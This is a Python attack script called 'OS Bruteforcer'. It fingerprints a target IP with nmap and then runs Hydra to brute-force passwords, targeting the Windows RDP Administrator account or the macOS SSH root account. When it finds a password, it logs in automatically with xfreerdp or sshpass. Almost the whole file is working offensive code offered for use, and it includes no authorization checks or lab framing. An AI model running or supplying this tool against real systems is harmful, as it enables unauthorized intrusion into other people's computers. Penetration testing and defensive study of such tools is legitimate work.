#!/usr/bin/env python3
import re
import subprocess
import time
import os
from colorama import init, Fore, Style

# Initialize colorama
init(autoreset=True)
def print_blue(text):
    """Print text in blue color."""
    print(Fore.BLUE + text)

def print_in_red(text):
    """Print text in red."""
    RED = "\033[91m"
    RESET = "\033[0m"
    print(f"{RED}{text}{RESET}")

def banner():
    """Show animated figlet banner with small author line."""
    try:
        # Big figlet text for the tool name
        result = subprocess.run(
            ["figlet", "OS Bruteforcer"],
            capture_output=True, text=True, check=True
        )
        for line in result.stdout.splitlines():
            print_blue(line)
            time.sleep(0.05)

        # Small author line (not figlet, just plain text)
        author = "<< Author: cyb2rS2c >>"
        for ch in author:
            print(Fore.YELLOW + ch, end="", flush=True)
            time.sleep(0.03)
        print()  # newline after animation

    except FileNotFoundError:
        # Fallback banner if figlet is missing
        print_blue("=== OS Bruteforcer ===")
        print(Fore.YELLOW + "<< Author: cyb2rS2c >>")


def detect_os(target_ip):
    """
    Detect the operating system of the target machine using nmap, with a focus on detecting macOS.
    """
    try:
        nmap_command = [
            'sudo', 'nmap', '-O', '--osscan-guess', '--fuzzy',
            '-p', '22,80,443,3389',
            '--min-rate=10000',
            target_ip
        ]
        print(f"Running nmap to detect the operating system on {target_ip}...")
        result = subprocess.run(nmap_command, capture_output=True, text=True, check=True)
        nmap_output = result.stdout

        if re.search(r'Mac OS X|macOS', nmap_output, re.IGNORECASE):
            return 'mac'
        elif re.search(r'ms-wbt-server', nmap_output, re.IGNORECASE):
            return 'windows'

        print(f"Nmap output:\n{nmap_output}")

    except subprocess.CalledProcessError as e:
        print_in_red(f"Error detecting OS: {e}. Nmap output: {e.stderr}")
    
    return None

def run_hydra(target_ip, password_file, wait_time=1):
    """
    Runs Hydra for brute-forcing depending on the target OS and connects using xfreerdp for Windows or SSH for macOS.
    """
    try:
        target_os = detect_os(target_ip)
        if not target_os:
            print_in_red(f"Could not determine the operating system of the target: {target_ip}.")
            return

        if target_os == 'windows':
            hydra_command = [
                'hydra', '-W', str(wait_time), '-l', 'Administrator',
                '-P', password_file, f'rdp://{target_ip}'
            ]
            print(f"Starting Hydra for RDP brute-force attack on Windows with wait time {wait_time}...")
            result = subprocess.run(hydra_command, capture_output=True, text=True, check=True)
            hydra_output = result.stdout
            print("Hydra RDP brute-force attack completed.")

            match = re.search(r'\[3389\]\[rdp\] host: {}.*?password: (\S+)'.format(target_ip), hydra_output, re.DOTALL)
            if match:
                password_success = match.group(1)
                print_blue(f"Found successful password: {password_success}")
                time.sleep(5)
                xfreerdp_command = ['xfreerdp', f'/u:Administrator', f'/p:{password_success}', f'/v:{target_ip}']
                print(f"Connecting to {target_ip} using xfreerdp...")
                subprocess.run(xfreerdp_command, check=True)
                print_blue(f"Connected to {target_ip} using xfreerdp.")
            else:
                print_in_red("No successful password found for RDP.")
        
        elif target_os == 'mac':
            hydra_command = [
                'hydra', '-W', str(wait_time), '-l', 'root',
                '-P', password_file, f'ssh://{target_ip}'
            ]
            print(f"Starting Hydra for SSH brute-force attack on macOS with wait time {wait_time}...")
            result = subprocess.run(hydra_command, capture_output=True, text=True, check=True)
            hydra_output = result.stdout
            print("Hydra SSH brute-force attack completed.")

            match = re.search(r'\[22\]\[ssh\] host: {}.*?password: (\S+)'.format(target_ip), hydra_output, re.DOTALL)
            if match:
                password_success = match.group(1)
                print_blue(f"Found successful password: {password_success}")
                time.sleep(5)
                ssh_command = ['sshpass', '-p', password_success, 'ssh', f'root@{target_ip}']
                print(f"Connecting to {target_ip} using SSH...")
                subprocess.run(ssh_command, check=True)
                print_blue(f"Connected to {target_ip} using SSH.")
            else:
                print_in_red("No successful password found for SSH.")
    
    except subprocess.CalledProcessError as e:
        print_in_red(f"Error executing command: {e}")
        print_in_red(f"Hydra stdout:\n{e.stdout}")
        print_in_red(f"Hydra stderr:\n{e.stderr}")

def main():
    banner()

    # Ask user for target IP
    target_ip = input('Enter the target IP of the device (Windows or macOS, e.g., 192.168.xx.xx): ').strip()

    # Flexible password file
    file = 'pass.txt'
    password_file = os.path.abspath(file)

    run_hydra(target_ip, password_file, wait_time=3)


if __name__ == "__main__":
    main()
